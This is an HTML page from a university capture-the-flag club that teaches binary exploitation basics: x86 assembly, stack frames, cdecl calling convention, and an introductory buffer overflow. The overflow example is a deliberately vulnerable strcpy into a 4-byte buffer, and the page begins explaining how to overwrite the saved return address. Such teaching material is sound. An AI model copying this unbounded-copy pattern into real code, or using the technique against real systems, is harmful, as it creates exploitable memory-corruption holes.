<!doctype html>
<html class="no-js" lang="">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>pwndevils</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="manifest" href="site.webmanifest">
    <link rel="apple-touch-icon" href="../icon.png">
    <!-- Place favicon.ico in the root directory -->
    <link rel="stylesheet" href="../css/normalize.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../highlight/styles/default.css">
    <link rel="stylesheet" href="../xterm/xterm.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body data-spy="scroll" data-target="#scroll-navbar" data-offset="100">
    <nav id="scroll-navbar" class="navbar navbar-inverse navbar-fixed-top">
        <div class="container-fluid">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#nav-content">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="../index.html">PWNDEVILS</a>
            </div>
            <div class="collapse navbar-collapse" id="nav-content">
                <ul class="nav navbar-nav">
                    <li class="dropdown">
                        <a class="dropdown-toggle" data-toggle="dropdown" href="../index.html">Home
                        <span class="caret"></span></a>
                        <ul class="dropdown-menu">
                            <li><a href="../index.html#about-club">About Club</a></li>
                            <li><a href="../index.html#about-faculty">Faculty</a></li>
                            <li><a href="../index.html#calendar">Calendar</a></li>
                            <li><a href="../index.html#videos">Videos</a></li>
                            <li><a href="../index.html#getting-started">Getting Started</a></li>
                            <li><a href="../index.html#history">History</a></li>
                        </ul>
                        <li><a href="#binary-exploit">Binary Exploitation</a></li>
                    </li>
                </ul>
                <ul class="nav navbar-nav navbar-right">
                    <li class="active"><a href="#banner">How2Hack</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!--
    _____          __  .__                        __      __.__.__      ________._____.  ___.           
  /  _  \  __ ___/  |_|  |__   ___________  /\  /  \    /  \__|  |    /  _____/|__\_ |__\_ |__   ______
 /  /_\  \|  |  \   __\  |  \ /  _ \_  __ \ \/  \   \/\/   /  |  |   /   \  ___|  || __ \| __ \ /  ___/
/    |    \  |  /|  | |   Y  (  <_> )  | \/ /\   \        /|  |  |__ \    \_\  \  || \_\ \ \_\ \\___ \ 
\____|__  /____/ |__| |___|  /\____/|__|    \/    \__/\  / |__|____/  \______  /__||___  /___  /____  >
        \/                 \/                          \/                    \/        \/    \/     \/ 
        -->
    <div id="loader-wrapper">
        <div id="loader"></div>
        <div class="loader-section section-left"></div>
        <div class="loader-section section-right"></div>
    </div>
    <div id="banner" class="container-fluid top-pad" style="background: black;">
        <div class="row">
            <img src="../img/pwndevils_banner.jpg" id="banner-img" alt="pwndevils ctf" class="img-responsive" />
        </div>
    </div>
    <div class="jumbotron text-center">
        <p>You have reached the amazingly awesome page of the <a href="https://ctftime.org/team/14321">pwndevils</a>, a hacking group started at Arizona State University. We love learning about computer systems and competing in <a href="https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security">Capture the Flag</a> to demonstrate our computer security knowledge.</p>
    </div>
    <div id="hacking-info" class="container bottom-pad">
        <div class="row">
            <h1 class="text-center"><b>So You Want To Learn How To Hack?</b></h1>
            <h4 class="text-center bottom-pad">Pick a category that interests you and get started!</h4>
            <div class="col-sm-4">
                <div class="col-sm-12 well">
                    <h2 class="text-center">Binary Exploitation</h2>
                    <p class="left-margin">Software applications that can be effected either locally or remotely by outside users.
                        <br>Sections:</br>
                        <ul>
                            <li>Tools</li>
                            <li>x86 Assembly</li>
                            <li>Buffer Overflows</li>
                            <li>Shellcode</li>
                            <li>Format Strings</li>
                            <li>ROP: Return Oriented Programming</li>
                            <li>Heap Exploitation</li>
                        </ul>
                        <br>
                    </p>
                    <button type="button" class="btn btn-success btn-lg center-block" onclick="location.href='#binary-exploit'">Exploit Some Binaries!</button>
                </div>
            </div>
            <div class="col-sm-4">
                <div class="col-sm-12 well">
                    <h2 class="text-center">Web Exploitation</h2>
                    <p class="left-margin">Web applications that can be effected to either gain undue permissions or access to sensitive information.
                        <br>Sections:</br>
                        <ul>
                            <li>Tools</li>
                            <li>Exploiting The Basics</li>
                            <li>XSS: Cross-side Scripting</li>
                            <li>XSRF: Cross-side Request Forgery</li>
                            <li>Configuration Vulnerabilities</li>
                        </ul>
                        <br></br>
                    </p>
                    <button type="button" class="btn btn-primary btn-lg center-block disabled">Wreck Some Sites!</button>
                </div>
            </div>
            <div class="col-sm-4">
                <div class="col-sm-12 well">
                    <h2 class="text-center">Cryptography</h2>
                    <p class="left-margin">Some application of cryptographic function(s) to turn plaintext into ciphertext.
                        <br>Sections:</br>
                        <ul>
                            <li>Resources</li>
                            <li>Basic Ciphers</li>
                            <li>ECB &amp; CBC</li>
                            <li>AES &amp; Public/Private Crypto</li>
                            <li>What To Look For</li>
                            <li>How To Approach It</li>
                        </ul>
                        <br></br>
                    </p>
                    <button type="button" class="btn btn-danger btn-lg center-block disabled">Break Some Codes!</button>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-sm-4">
                <div class="col-sm-12 well">
                    <h2 class="text-center">Forensics</h2>
                    <p class="left-margin">Disk or Network Traffic captures that have some form of interesting conversation or data.
                        <br>Sections:</br>
                        <ul>
                            <li>Tools</li>
                            <li>Physical Storage</li>
                            <li>Network Traffic</li>
                            <li>Partial Data Recovery</li>
                            <li>Time Stamp Manipulation</li>
                        </ul>
                        <br></br>
                    </p>
                    <button type="button" class="btn btn-warning btn-lg center-block disabled">Find Something Hidden!</button>
                </div>
            </div>
        </div>
    </div>
    <div id="binary-exploit" class="container-fluid bottom-pad">
        <h1 class="text-center bottom-pad parallax" style="padding-top: 40px;"><b>Binary Exploitation</b></h1>
        <div class="row center-block" id="binary-tools">
            <h2 class="text-center"><b>Tools</b></h2>
            <div class="col-sm-3 col-sm-offset-1">
                <div class="col-sm-11 col-sm-offset-2">
                    <p>The first thing that you want to do is set up your environment. If you're not running some version of linux you can use a Virtual Machine (You can use a MAC, but a VM is recommended). A good free option is <a href="https://www.virtualbox.org/wiki/Downloads">Oracle's VirtualBox</a>, but you can use any Virtul Machine softare you're comfortable with.</p>
                </div>
            </div>
            <div class="col-sm-3">
                <div class="col-sm-11 col-sm-offset-2">
                    <p>Once you have a VM software, you'll need a linux operating system. If you're new to linux, I'd suggest going with <a href="https://www.ubuntu.com/desktop/1710">Ubuntu</a>, but you can use any linux operating system that you want to. If you're on a 64-bit linux system, we'll want to install the necessary 32-bit libraries. Install them on Ubuntu using <b>sudo apt-get install gcc-multilib</b>.</p>
                </div>
            </div>
            <div class="col-sm-4">
                <div class="col-sm-9 col-sm-offset-1">
                    <p>Let's set up our python environment! We'll be using python2.7 for some of our challenges so everything that we install will be for that version. A fantastic library of explotation tools for python is <a href="https://docs.pwntools.com/en/stable/">pwntools</a>. You can install it with <b>pip install pwntools</b>. We'll also install <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> with <b>pip install ropgadget</b>. There are some dependencies for this library which may cause problems. An optional upgrade for GDB called <a href="https://github.com/hugsy/gef">GEF</a>.</p>
                </div>
            </div>
        </div>
        <div class="row bottom-pad" id="assembly">
            <h2 class="text-center bottom-pad"><b>x86 Assembly</b></h2>
            <h3 class="text-center">Global Variables</h3>
            <div class="col-sm-3 col-sm-offset-3">
                <pre><code class="language-cpp">   
    int a;
    int b;
    float c;
    int main() {
        a = 10;
        b = 100;
        c = 10.45;
        a = a + b;
        return 0;
    }
                </code></pre>
            </div>
            <div class="col-sm-3">
                <pre><code class="x86asm hljs">    ;a @ 0x8049634
    ;b @ 0x8049638
    ;c @ 0x804963c
    main:
        movl 0x8049634, 0xa
        movl 0x8049638, 0x64
        mov eax, 0x41273333
        mov 0x804963c, eax
        mov edx, 0x8049634
        mov eax, 0x8049638
        lea eax, [edx+eax*1]
        mov 0x8049634, eax</code></pre>
            </div>
        </div>
        <div class="row bottom-pad">
            <div class="col-sm-6 col-sm-offset-3">
                <div class="row">
                    <div class="col-sm-8">
                        <p>So what's going on here? Above are two snippets of code, the first is C code for a small program and the second is it's corresponding x86 assembly code. Let's take a look first at what our variables are in the C code and how they relate to the assembly code.</p>
                        <p>The first three lines of C code declare some global variables, two int's and one float. However, the equivalent lines for x86 show that the variables are actualy stored at memory locations. Notice that each of the locations are offests of 4 from eachother. This is due to the fact that int's and floats take up 32-bits or 4 bytes each. The second thing to notice is that this is a hard memory address. Each time the binary is run, the variables will always be located at these exact addresses. Now to get into the actual main method.</p>
                    </div>
                    <div class="col-sm-4">
                        <pre><code class="cpp">int a;
int b;
float c;</code></pre>
                        <pre><code class="x86asm">;a @ 0x8049634
;b @ 0x8049638
;c @ 0x804963c</code></pre></div>
                </div>
                <div class="row">
                    <div class="col-sm-8">
                        <p>
                            <br>The assignments in C are plain enough where <b>a = 10</b> and <b>b = 100</b>. It's a little different for x86. First, there are two syntaxs for x86 assembly (Intel and AT&amp;T). We'll be focusing on the Intel syntax. Now, onto the instructions.</p>
                        <p>In Intel syntax, the source is on the right and the destination is on the left. The <b>movl</b> instruction moves 32-bits from the source to the destination. The first instruction moves <b>0xa</b> (10 in decimal) to the memory location <b>0x8049634</b> which is actually the location of the <b>a</b> variable. Now that memory location has a value of 0xa which is what our C code did. The next line is very similar, I'll let you figure out what it does.</p>
                    </div>
                    <div class="col-sm-4">
                        <pre style="margin-top: 10%;"><code class="cpp">a = 10;
b = 100;</code></pre>
                        <pre><code class="x86asm">movl 0x8049634, 0xa
movl 0x8049638, 0x64</code></pre>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-8">
                        <p>
                            <br>It's important to note that in x86, there are several general purpose registers that are used often: eax, ebx, ecx, and edx. For our purposes you can think of them as registers that are used to store values temporarily so that they can be used in operations such as addition or division.</p>
                        <p><b>mov</b> is much like <b>movl</b>, but it is mostly used with registers rather than immediate values. In this case, the value stored in <b>0x8049634</b> or <b>a</b> is moved into <b>edx</b>. The same is done with <b>b</b> and <b>eax</b>. The <b>lea</b> instruction is an optimization trick by the compiler that bypasses the ALU and uses the address bus. The ['s are actually dereferences an address. Essentially, it loads the value of <b>edx</b> + <b>eax</b> into <b>eax</b> meaning <b>eax</b> = <b>eax</b> + <b>edx</b>. The final line moves <b>eax</b> into the location that <b>a</b> is stored at.</p>
                    </div>
                    <div class="col-sm-4">
                        <pre style="margin-top: 10%;"><code class="cpp">a = a + b;</code></pre>
                        <pre><code class="x86asm">mov edx, 0x8049634
mov eax, 0x8049638
lea eax, [edx+eax*1]
mov 0x8049634, eax</code></pre></div>
                </div>
            </div>
        </div>
        <h3 class="text-center">Stack Example</h3>
        <div class="row bottom-pad">
            <div class="col-sm-3 col-sm-offset-2">
                <div class="container-fluid">
                    <p>On the bottom left, there are x86 register names as well as the corresponding values in those registers. We've seen <b>eax</b> and <b>ebx</b> before, but what's <b>esp</b>? The <b>esp</b> is the <b>Stack Register</b>. It keeps track of where exactly we are on the stack in memory.</p>
                    <p>The stack is divided into sections of 4 bytes also known as a word. This means that each time the stack value changes it's by a multiple of 4. Take note, that the stack starts at high memory addresses and grows to low memory address. Our starting value here is at 0x10000 as shown in the bottom left. When we push what is in <b>eax</b> onto the stack, the value of the stack point is decremented by 4 because it is growing towards lower memory. Then when we pop <b>ebx</b>, it means that the value at the stack pointer is moved into the specified register (<b>ebx</b> in this case). Then, the memory that the location was taking up is deallocated by moving the pointer back a word.</p>
                </div>
            </div>
            <div class="col-sm-4 well mobile-margin-left mobile-margin-right">
                <div class="row">
                    <div class="col-sm-5 col-sm-offset-3 bottom-pad">
                        <h5 class="text-center">0xFFFFFFFF</h5>
                        <div class="stack-loc" id="main-ex-stack">... &nbsp; &nbsp; ... Garbage</div>
                        <h5 class="text-center">0x00000000</h5>
                    </div>
                    <div class="col-sm-3" style="margin-top: 35px;">
                        <div class="row">
                            <pre><code class="x86asm" id="stack-example-asm">push eax
pop ebx</code></pre>
                            <button type="button" class="btn btn-success btn-lg center-block" style="margin-bottom: 10px;" id="stack-test-button">Start</button>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-5" id="register-ex-stack">
                        <div class="stack-loc" style="float: left; display: inline; width: 50%;">eax ebx esp</div>
                        <div class="stack-loc" style="float: left; display: inline; width: 50%;">0xa &nbsp; 0x10000</div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row bottom-pad" id="assembly">
            <h3 class="text-center">Local Variables</h3>
            <div class="col-sm-3 col-sm-offset-2">
                <pre><code class="cpp">  
    int main() {

        int a;
        int b;
        float c;
        a = 10;
        b = 100;
        c = 10.45;
        a = a + b;
        return 0;
    }
                </code></pre>
            </div>
            <div class="col-sm-3">
                <pre><code class="x86asm hljs">    ;a @ [ebp-0xc]
    ;b @ [ebp-0x8]
    ;c @ [ebp-0xa]
    main:
        mov ebp, esp
        sub esp, 0x10
        movl [ebp-0xc], 0xa
        movl [ebp-0x8], 0x64
        mov eax, 0x41273333
        mov [ebp-0x4], eax
        mov eax, [ebp-0x8]
        add [ebp-0xc], eax
        </code></pre>
            </div>
            <div class="col-sm-1 well stack-loc mobile-margin-left mobile-margin-right">0x41273333 0x64 0xa ???? ???? ????</div>
            <div class="col-sm-1 text-center">
                <p style="font-size: 5.4em;">&rarr;</p>
            </div>
            <div class="col-sm-1 well stack-loc mobile-margin-left mobile-margin-right">0x41273333 0x64 0x6e ???? ???? ????</div>
        </div>
        <div class="row" id="assembly">
            <div class="col-sm-6 col-sm-offset-3">
                <div class="row">
                    <div class="col-sm-8">
                        <p>So, what's the difference between global variables and local variables. The answer is scope, but you probably already knew that. Now, look back at the global variable example and you'll see that the variables have hard coded addresses in assembly. Now look at where the variables are stored when they're initialized as local variables. If you compare the global and local variable example, you'll see that the only real difference is that instead of the hex address, we have this weird <b>[ebp-NUM]</b> where <b>NUM</b> is any hex value.</p>
                        <p>To understand this, we'll need to know what the <b>ebp</b> is. The <b>ebp</b> is the <b>Base Pointer</b>, also known as the <b>Frame Pointer</b>. Whenever a function is called, depending on its memory needs, it may allocate some amount of the stack to use as scrap memory. This is where the <b>ebp</b> comes in. It acts as an indicator to the start of a function frame which is the start of the function's stack. When local variables are created they are stored on the stack because they are temporary and only live within their own scope. You can see their storage on stacks to the right of the example assembly code. Since the <b>ebp</b> has the location of the start of the stack for the function, the local variables can be accessed using offsets of it. Assuming the <b>ebp</b> points at the very top of the example stacks, <b>[ebp-0x4]</b> would be the first word shown on the stack with <b>[ebp-0x8]</b> being the second and so on.</p>
                    </div>
                    <div class="col-sm-4">
                        <pre><code class="cpp">int a;
int b;
float c;</code></pre>
                        <pre><code class="x86asm">;a @ [ebp-0xc]
;b @ [ebp-0x8]
;c @ [ebp-0x4]</code></pre>
                        <pre><code class="x86asm">mov ebp, esp
sub esp, 0x10</code></pre>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-8">
                        <p>Just as with the global variable example, let's look at what the assignment of the local variables look like. The C code is the same for assignments, but the assembly code is different. Since the variables are local, they are located on the stack rather than at a hard coded address like the global variables. This means that accessing the variables on the stack will be done with an offset from <b>ebp</b>. The <b>movl</b> instruction has the same function as the global variable example. The rest of the assembly is essential the same as well, except with the reference to the variables replaced with offsets of <b>ebp</b> and since we can store stuff on the stack there is no need to use the <b>lea</b> instruction to add and store the results.</p>
                    </div>
                    <div class="col-sm-4">
                        <pre><code class="cpp">a = 10;
b = 100;</code></pre>
                        <pre><code class="x86asm">movl [ebp-0xc], 0xa
movl [ebp-0x8], 0x64</code></pre>
                    </div>
                </div>
            </div>
        </div>
        <h3 class="text-center">Local Variable Example</h3>
        <div class="row bottom-pad mobile-margin-left-small mobile-margin-right-small">
            <div class="col-sm-4 col-sm-offset-4 well">
                <div class="row">
                    <div class="col-sm-5 col-sm-offset-3 bottom-pad">
                        <h5 class="text-center">0xFFFFFFFF</h5>
                        <div class="stack-loc" id="local-var-ex-stack">..... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div>
                        <h5 class="text-center">0x00000000</h5>
                    </div>
                    <div class="col-sm-4" style="margin-top: 35px;">
                        <div class="row">
                            <pre><code class="x86asm" id="local-var-ex-asm">mov ebp, esp
sub esp, 0x10
movl [ebp-0xc], 0xa
movl [ebp-0x8], 0x64
mov eax, 0x41273333
mov [ebp-0x4], eax
mov eax, [ebp-0x8]
add [ebp-0xc], eax</code></pre>
                            <button type="button" class="btn btn-success btn-lg center-block" style="margin-bottom: 10px;" id="local-var-test-button">Start</button>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-5" id="register-local-ex-stack">
                        <div class="stack-loc" style="float: left; display: inline; width: 50%;">eax esp ebp</div>
                        <div class="stack-loc" style="float: left; display: inline; width: 50%;">&nbsp; 0x10000 &nbsp;</div>
                    </div>
                </div>
                <div class="row" style="margin-top: 10px;">
                    <p class="text-center">Note: The blue highlight is the <b>ebp</b> and the yellow is <b>esp</b> on the stack.</p>
                </div>
            </div>
        </div>
        <div class="row" id="assembly">
            <h3 class="text-center">Function Frames and Calling Convention</h3>
            <div class="col-sm-3 col-sm-offset-3">
                <pre><code class="cpp">


int callee(int a, int b)
{
    return a + b + 1;
}



int main()
{
    int a;
    a = callee(10, 40);
    return a;
}




</code></pre>
            </div>
            <div class="col-sm-3">
                <pre><code class="x86asm hljs">callee:
    push ebp                ;0x8048394
    mov ebp, esp            ;0x8048395
    mov eax, [ebp+0xc]      ;0x8048397
    mov edx, [ebp+0x8]      ;0x804839a
    add eax, edx            ;0x804839d
    add eax, 0x1            ;0x80483a0
    pop ebp                 ;0x80483a3
    ret                     ;0x80483a4
main:
    push ebp                ;0x80483a5
    mov ebp, esp            ;0x80483a6
    sub esp, 0x18           ;0x80483a8
    movl [esp+0x4], 0x28    ;0x80483ab
    movl [esp+0x0], 0xa     ;0x80483b3
    call callee             ;0x80483ba
    mov [ebp-0x4], eax      ;0x80483bf
    mov eax, [ebp-0x4]      ;0x80483c2
    leave                   ;0x80483c5
    ret                     ;0x80483c6</code></pre>
            </div>
        </div>
    </div>
    <div class="row mobile-margin-left-small mobile-margin-right-small" id="assembly">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>We've already talked a little about what function frames are, so let's complete our understanding. To the right is what's known as the prologue of a function frame. The first thing that's always done is the <b>ebp</b> is pushed to the stack. This saves the previous function's <b>Frame Pointer</b> so that when it is returned to it knows where the start of it's stack is and it's local variables and memory can be accessed. The next operation that is essential is the <b>esp</b> is moved into the <b>ebp</b>. This essentially moves the <b>ebp</b> from the start of the stack to where the <b>esp</b> currently points to. This is to start a new function frame. The next step is only necessary for function frames that require space on the stack. The <b>sub</b> of some amount from <b>esp</b> allocates memory on the stack by creating space between <b>ebp</b> and <b>esp</b>.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm">push ebp
mov ebp, esp
sub esp, 0x18</code></pre>
                </div>
            </div>
            <div class="row">
                <div class="col-sm-8">
                    <p>These two instructions are what's known as the epilogue of the function frame. The <b>leave</b> instruction is actually a combination of two instructions: <b>mov esp, ebp</b> and <b>pop ebp</b>. Moving <b>ebp</b> into <b>esp</b> essentially deletes the previously allocated stack. Now, the stack pointer is where the previous saved base pointer is. That is, where <b>ebp</b> was originally pushed in the The other instruction, <b>ret</b>, is actually an alias for <b>pop eip</b>. What's the <b>eip</b>? The <b>eip</b> is what's known as the instruction pointer. It's job is to move to the next instruction. The <b>eip</b> can't be directly effected by <b>pop</b>s which is why <b>ret</b> is used instead. If you look at the above example, the comments next to each line is the address of the instruction. The <b>eip</b> loads the next address of each instruction to ready it for execution.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm">leave
ret</code></pre>
                </div>
            </div>
            <div class="row">
                <div class="col-sm-8">
                    <p>This leads us into the calling convection of x86 assembly called cdecl. The base of it is that all functions must have their parameters on the top of the stack before calling the function. If we look up we can see that the callee function takes two ints as parameters. You can see that before calle is called in assembly, the two instructions above it move integers to <b>esp+4</b> and <b>esp+0</b>. This is the same as pushing the ints one after the other since they would be on the same place on the stack. The reason they aren't pushed is because some of the stack was already allocated so it's better to use the allocated space. The <b>call</b> instruction, much like the leave instruction, is actually two instructions: <b>push eip</b> and <b>jmp FUNC</b>. There are two things to note. Firstly, the <b>push eip</b> actually pushed the address of the next instruction so that when we return to the original function we start executing at that instruction. Secondly, we haven't talked about the <b>jmp</b> instruction, but it's pretty simple. It just sets <b>eip</b> to the raw address or address of the label that it's given. The last thing to mention about cdecl is that the return data is always stored in <b>eax</b>.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm">movl [esp+0x4], 0x28
movl [esp+0x0], 0xa
call callee</code></pre>
                </div>
            </div>
        </div>
    </div>
    <h3 class="text-center">Calling Convention Example</h3>
    <div class="row bottom-pad mobile-margin-left mobile-margin-right">
        <div class="col-sm-6 col-sm-offset-3 well">
            <div class="row">
                <div class="col-sm-4 col-sm-offset-3 bottom-pad">
                    <h5 class="text-center">0xFFFFFFFF</h5>
                    <div class="stack-loc" id="call-conv-ex-stack">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div>
                    <h5 class="text-center">0x00000000</h5>
                </div>
                <div class="col-sm-5" style="margin-top: 35px;">
                    <div class="row">
                        <pre><code class="x86asm" id="call-conv-ex-asm">callee:
    push ebp                ;0x8048394
    mov ebp, esp            ;0x8048395
    mov eax, [ebp+0xc]      ;0x8048397
    mov edx, [ebp+0x8]      ;0x804839a
    add eax, edx            ;0x804839d
    add eax, 0x1            ;0x80483a0
    pop ebp                 ;0x80483a3
    ret                     ;0x80483a4
main:
    push ebp                ;0x80483a5
    mov ebp, esp            ;0x80483a6
    sub esp, 0x18           ;0x80483a8
    movl [esp+0x4], 0x28    ;0x80483ab
    movl [esp+0x0], 0xa     ;0x80483b3
    call callee             ;0x80483ba
    mov [ebp-0x4], eax      ;0x80483bf
    mov eax, [ebp-0x4]      ;0x80483c2
    leave                   ;0x80483c5
    ret                     ;0x80483c6</code></pre>
                        <button type="button" class="btn btn-success btn-lg center-block" style="margin-bottom: 10px;" id="call-conv-test-button">Start</button>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-sm-5" id="register-call-conv-ex-stack">
                    <div class="stack-loc" style="float: left; display: inline; width: 50%;">eax edx esp ebp eip</div>
                    <div class="stack-loc" style="float: left; display: inline; width: 50%;">&nbsp; &nbsp; 0x10004 0x100a0 0x80483a5</div>
                </div>
            </div>
            <div class="row" style="margin-top: 10px;">
                <p class="text-center">Note: The blue highlight is the <b>ebp</b> and the yellow is <b>esp</b> on the stack.</p>
            </div>
        </div>
    </div>
    </div>
    <div class="row bottom-pad bottom-pad mobile-margin-left-small mobile-margin-right-small" id="buffer-overflows">
        <h2 class="text-center"><b>Buffer Overflows</b></h1>
            <h3 class="text-center">The Accident</h2>
        <div class="row bottom-pad" id="assembly">
            <div class="col-sm-3 col-sm-offset-3">
                <pre><code class="language-cpp">   

#include &lt;string.h&gt;
#include &lt;stdio.h&gt;


void mycpy(char* str)
{
    char foo[4];
    strcyp(foo, str);
}


int main()
{
    mycpy("asu cse 340 fall 2015 rocks!");
    printf("After");
    return 0;
}



                </code></pre>
            </div>
            <div class="col-sm-3">
                <pre><code class="x86asm hljs">mycpy: 
    push ebp                    ;0x80483f4
    mov ebp, esp                ;0x80483f5
    sub esp, 0x28               ;0x80483f7
    mov eax, [ebp+0x8]          ;0x80483fa
    mov [esp+0x4], eax          ;0x80483fd
    lea eax, [ebp-0xc]          ;0x8048401
    mov [esp+0x0], eax          ;0x8048404
    call strcpy                 ;0x8048407
    leave                       ;0x804840c
    ret                         ;0x804840d
main:
    push ebp                    ;0x804840e
    mov ebp, esp                ;0x804840f
    sub esp, 0x10               ;0x8048414
    movl [esp+0x0], 0x8048504   ;0x8048417
    call mycpy                  ;0x804841e
    mov eax, 0x8048517          ;0x8048423
    mov [esp+0x0], eax          ;0x8048428
    call printf                 ;0x804842b
    mov eax, 0x0                ;0x8048430
    leave                       ;0x8048435
    ret                         ;0x8048436</code></pre>
            </div>
        </div>
        <div class="row bottom-pad">
            <div class="col-sm-6 col-sm-offset-3">
                <div class="row">
                    <div class="col-sm-8">
                        <p>We already know what the assembly does, so let's talk about what a buffer overflow is and why or how it can occur. Think back to how function frames work. If a function is called it pushes the address of the next instruction and then the prologue of the called function pushes the <b>ebp</b>. The other important factor is local variables. Remember that local variables are stored on the stack as offsets of the <b>ebp</b>. The combination of these two things is what can lead to a classic buffer overflow. Looking at C code, the basic example is allocating a local buffer with some amount of space and then over filling it. Find the flaw in the above code example and then try it below!</p>
                    </div>
                    <div class="col-sm-4">
                        <pre><code class="cpp">void mycpy(char* str)
{
    char foo[4];
    strcyp(foo, str);
}</code></pre></div>
                </div>
            </div>
        </div>
        <h3 class="text-center">Overflow Example</h3>
        <div class="row bottom-pad bottom-pad mobile-margin-left-small mobile-margin-right-small">
            <div class="col-sm-6 col-sm-offset-3 well">
                <div class="row">
                    <div class="col-sm-4 col-sm-offset-3 bottom-pad">
                        <h5 class="text-center">0xFFFFFFFF</h5>
                        <div class="stack-loc" id="overflow-ex-stack">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</div>
                        <h5 class="text-center">0x00000000</h5>
                    </div>
                    <div class="col-sm-5" style="margin-top: 35px;">
                        <div class="row">
                            <pre><code class="x86asm" id="overflow-ex-asm">mycpy: 
    push ebp                   ;0x80483f4
    mov ebp, esp               ;0x80483f5
    sub esp, 0x28              ;0x80483f7
    mov eax, [ebp+0x8]         ;0x80483fa
    mov [esp+0x4], eax         ;0x80483fd
    lea eax, [ebp-0xc]         ;0x8048401
    mov [esp+0x0], eax         ;0x8048404
    call strcpy                ;0x8048407
    leave                      ;0x804840c
    ret                        ;0x804840d
main:
    push ebp                   ;0x804840e
    mov ebp, esp               ;0x804840f
    sub esp, 0x10              ;0x8048414
    movl [esp+0x0], 0x8048504  ;0x8048417
    call mycpy                 ;0x804841e
    mov eax, 0x8048517         ;0x8048423
    mov [esp+0x0], eax         ;0x8048428
    call printf                ;0x804842b
    mov eax, 0x0               ;0x8048430
    leave                      ;0x8048435
    ret                        ;0x8048436</code></pre>
                            <button type="button" class="btn btn-success btn-lg center-block" style="margin-bottom: 10px;" id="overflow-test-button">Start</button>
                            <p class="text-center hidden" id="segfault-overflow" style="color: red;"><b>SEGFAULT: 0x22313032</b></p>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-5" id="register-overflow-ex-stack">
                        <div class="stack-loc" style="float: left; display: inline; width: 50%;">eax esp ebp eip</div>
                        <div class="stack-loc" style="float: left; display: inline; width: 50%;">&nbsp; 0x10004 0x100a0 0x804840e</div>
                    </div>
                </div>
                <div class="row" style="margin-top: 10px;">
                    <p class="text-center">Note: The blue highlight is the <b>ebp</b> and the yellow is <b>esp</b> on the stack.</p>
                </div>
            </div>
        </div>
        <div class="row mobile-margin-left-small mobile-margin-right-small">
            <div class="col-sm-6 col-sm-offset-3">
                <p>As the text at the end of the example states, there would be a segfault when the program returns. Why? It's actually pretty easy to understand. When the program calls <b>strcpy</b> it writes the string to the specified location on the stack which happens to be <b>ebp-0xc</b> which is also <b>0xffdc</b>. However, the string that's written to that location is much larger than four characters. This doesn't stop <b>strcpy</b> though. There's nothing that tells it not to write the entire string so it does. In the process, it overwrites what was previously on the stack. If you look at what is on the stack when strcpy is called you will see the <b>saved ebp</b> directly above where the <b>ebp</b> register points to. The <b>saved ebp</b> is the value of <b>ebp</b> from the previous function. Directly above that is what's called the <b>saved eip</b> which is the address of the instruction that we should return to when we finish this function.</p>
                <p>Now, when <b>strcpy</b> is called look at what happens to those values. They get completely overwritten by the contents of the string. Watch what happens when <b>leave</b> and <b>ret</b> are called. The value that is in <b>ebp</b> when leave is called is actually the little-endian value of the ascii in that location. The same is true of <b>eip</b> when <b>ret</b> is called. This means that the <b>eip</b> tries to go to the location of the instruction that is actually the little-endian ascii characters which is definitely not a valid address.</p>
                <p><b>P.S.</b> In x86, all values are actually little endian which means the most significant byte is actually the least significat byte. For example: the value of the string "step" is 0x73746570 to make this little-endian just reverse the byte order so it becomes 0x70657473.</p>
            </div>
        </div>
    </div>
    <h3 class="text-center bottom-pad">Calling Things You Shouldn't</h3>
    <div class="row mobile-margin-left mobile-margin-right">
        <div class="col-sm-4 col-sm-offset-3">
            <p>I've gone ahead and modified the example that we had earlier. You'll see that the same vulnerability exists, but there is now an additional method called <b>notCalled()</b>. As the name states, the function is never called. That's where we come in. But how? How can you call a method that's not called? Wrack your brain a bit. Is there something from the x86 assembly we know of that controls where a program goes? That's right, the <b>eip</b>! It points to the address of the next instruction. If you look back at the last example for x86 you'll see that the <b>saved eip</b> gets overwritten by the local buffer and then we get a segfault when trying to go to the invalid locaiton.</p>
            <p>So now that we have a goal, to control the <b>saved eip</b>, how do we go about doing it in a way that is useful to us. The first real step is to understand and dissect what the program does. Looking at the code, you can see that it will only accept two arguments and that the second argument is passed to the <b>mycpy</b>.</p>
